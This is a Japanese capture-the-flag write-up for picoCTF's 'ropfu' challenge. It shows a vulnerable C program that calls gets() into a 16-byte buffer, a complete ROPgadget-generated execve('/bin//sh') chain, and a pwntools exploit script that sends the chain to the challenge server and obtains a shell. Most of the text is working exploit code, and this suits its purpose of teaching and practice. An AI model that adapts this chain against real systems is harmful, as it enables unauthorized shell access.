# ropfu
以下のコードが渡される
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}
```

`vuln`関数の`gets`でBoF可能

## checksec
```
Canary                        : ✓
NX                            : ✘
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```
カナリアのみ有効

## rop gadget
```
$ ROPgadget --binary ./vuln --ropchain

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x80590f2 mov dword ptr [edx], eax ; ret
        [+] Gadget found: 0x80583b9 pop edx ; pop ebx ; ret
        [+] Gadget found: 0x80b073a pop eax ; ret
        [+] Gadget found: 0x804fb80 xor eax, eax ; ret

- Step 2 -- Init syscall number gadgets

        [+] Gadget found: 0x804fb80 xor eax, eax ; ret
        [+] Gadget found: 0x808054e inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

        [+] Gadget found: 0x8049022 pop ebx ; ret
        [+] Gadget found: 0x8049e29 pop ecx ; ret
        [+] Gadget found: 0x80583b9 pop edx ; pop ebx ; ret

- Step 4 -- Syscall gadget

        [+] Gadget found: 0x804a3c2 int 0x80

- Step 5 -- Build the ROP chain

#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b''

p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
        p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b073a) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5064) # @ .data + 4
        p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b073a) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
        p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804fb80) # xor eax, eax ; ret
p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x08049e29) # pop ecx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
        p += pack('<I', 0x080e5060) # padding without overwrite ebx
p += pack('<I', 0x0804fb80) # xor eax, eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0804a3c2) # int 0x80
```

なんとペイロードまで出力してくれた
使ってみる

```python
from pwn import *
from struct import pack

# p = process("./vuln")
io = remote("saturn.picoctf.net", 52999)

p = b"A" * 28
p += pack("<I", 0x080583B9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5060)  # @ .data
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x080B073A)  # pop eax ; ret
p += b"/bin"
p += pack("<I", 0x080590F2)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x080583B9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5064)  # @ .data + 4
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x080B073A)  # pop eax ; ret
p += b"//sh"
p += pack("<I", 0x080590F2)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x080583B9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5068)  # @ .data + 8
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x0804FB80)  # xor eax, eax ; ret
p += pack("<I", 0x080590F2)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x08049022)  # pop ebx ; ret
p += pack("<I", 0x080E5060)  # @ .data
p += pack("<I", 0x08049E29)  # pop ecx ; ret
p += pack("<I", 0x080E5068)  # @ .data + 8
p += pack("<I", 0x080583B9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5068)  # @ .data + 8
p += pack("<I", 0x080E5060)  # padding without overwrite ebx
p += pack("<I", 0x0804FB80)  # xor eax, eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0804A3C2)  # int 0x80

data = io.recvline().rstrip().decode()
print(data)
print(p)
io.sendline(p)
io.interactive()
```

シェルを取れた
